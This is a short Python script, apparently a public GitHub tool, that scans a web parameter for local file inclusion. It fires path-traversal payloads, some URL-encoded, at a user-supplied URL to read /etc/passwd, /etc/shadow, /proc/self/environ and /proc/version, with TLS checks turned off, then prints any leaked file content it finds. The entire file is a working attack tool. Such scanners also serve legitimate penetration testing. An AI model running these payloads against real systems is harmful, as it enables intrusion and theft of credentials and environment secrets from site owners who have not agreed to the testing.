#!/usr/bin/env python3
"""
LFI Scanner - Local File Inclusion tester
Author: nadirzhon | github.com/nadirzhon
"""

import requests
import argparse
from colorama import Fore, Style, init

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

PAYLOADS = [
    "../../../etc/passwd", "....//....//....//etc/passwd",
    "../../../etc/shadow", "..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd", "/proc/self/environ", "/proc/version",
]
INDICATORS = [("root:", "/etc/passwd"), ("Linux version", "/proc/version"),
              ("PATH=", "/proc/self/environ")]

def test(url, param, payload):
    try:
        r = requests.get(f"{url}?{param}={payload}", timeout=5, verify=False)
        for indicator, name in INDICATORS:
            if indicator in r.text:
                return True, r.text[:200]
    except Exception:
        pass
    return False, ""

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-p", "--param", required=True)
    args = parser.parse_args()
    print(f"{Fore.CYAN}[*] LFI Test: {args.url} param={args.param}{Style.RESET_ALL}\n")
    for payload in PAYLOADS:
        found, content = test(args.url, args.param, payload)
        if found:
            print(f"{Fore.GREEN}[+] VULN: {payload}")
            print(f"    {content[:100]}")
        else:
            print(f"{Fore.RED}[-] {payload}")

if __name__ == "__main__":
    main()
